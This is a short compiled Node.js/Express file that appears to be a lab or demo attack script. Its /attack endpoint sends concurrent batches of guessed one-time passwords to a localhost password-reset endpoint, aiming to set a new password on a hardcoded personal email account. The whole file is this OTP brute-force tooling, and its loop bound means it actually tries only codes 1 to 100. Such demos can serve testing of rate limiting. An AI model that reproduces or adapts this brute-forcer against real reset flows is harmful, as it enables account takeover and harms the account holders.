"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const axios_1 = __importDefault(require("axios"));
const app = (0, express_1.default)();
app.use(express_1.default.json());
function request(index) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield axios_1.default.post("http://localhost:3001/reset-password", {
                email: "yashpate1@gmail.com",
                otp: index,
                newPassword: "Sos@12345",
            });
        }
        catch (e) {
            console.log(e);
        }
    });
}
app.post("/attack", () => __awaiter(void 0, void 0, void 0, function* () {
    for (let index = 1; index < 6; index += 100) {
        const p = [];
        for (let j = 0; j < 100; j++) {
            p.push(request((index + j).toString()));
        }
        yield Promise.all(p);
    }
}));
app.listen(3000, () => {
    console.log("App RUning on port 3000");
});
